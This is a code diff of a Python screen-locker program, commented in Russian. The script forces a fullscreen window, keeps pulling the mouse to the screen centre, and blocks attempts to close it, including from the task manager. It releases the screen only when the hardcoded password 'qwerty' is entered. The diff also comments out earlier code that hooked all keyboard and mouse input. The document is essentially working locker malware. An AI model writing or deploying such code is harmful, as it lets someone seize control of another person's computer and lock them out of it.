@@ -2,7 +2,35 @@ import pyautogui
 from  tkinter import Tk, Entry, Label
 from pyautogui import click, moveTo
 from time import sleep
-import pythoncom, pyHook
+#import pythoncom, pyHook
+
+def callback(event):
+    global k, entry
+    if entry.get() == "qwerty":
+        k = True
+
+def on_closing():
+    # Кликаем в центр экрана
+    click(width/2, height/2)
+
+    # Перемещаем курсор мыши в центр экрана
+    moveTo(width/2, height/2)
+
+    # Включаем полноэкранный режим
+    root.attributes("-fullscreen", True)
+
+    # При попытке закрыть окно с помощью диспетчера задач вызываем on_closing
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+
+    # Включаем постоянное обновление окна
+    root.update()
+
+    # Добавляем сочетание клавиш, которое будет закрывать программу
+    root.bind('<Control-KeyPress-c>', callback)
+
+
+
+
 
 
 # Создаем  окно
@@ -47,33 +75,10 @@ while not k:
    on_closing()
 
 
-hm = pyHook.HookManager()
-hm.MouseAll = uMad
-hm.KeyAll = uMad
-hm.HookMouse()
-hm.HookKeyboard()
-pythoncom.PumpMessages()
+#hm = pyHook.HookManager()
+#hm.MouseAll = uMad
+#hm.KeyAll = uMad
+#hm.HookMouse()
+#hm.HookKeyboard()
+#pythoncom.PumpMessages()
 
-def callback(event):
-    global k, entry
-    if entry.get() == "qwerty":
-        k = True
-
-def on_closing():
-    # Кликаем в центр экрана
-    click(width/2, height/2)
-
-    # Перемещаем курсор мыши в центр экрана
-    moveTo(width/2, height/2)
-
-    # Включаем полноэкранный режим
-    root.attributes("-fullscreen", True)
-
-    # При попытке закрыть окно с помощью диспетчера задач вызываем on_closing
-    root.protocol("WM_DELETE_WINDOW", on_closing)
-
-    # Включаем постоянное обновление окна
-    root.update()
-
-    # Добавляем сочетание клавиш, которое будет закрывать программу
-    root.bind('<Control-KeyPress-c>', callback)
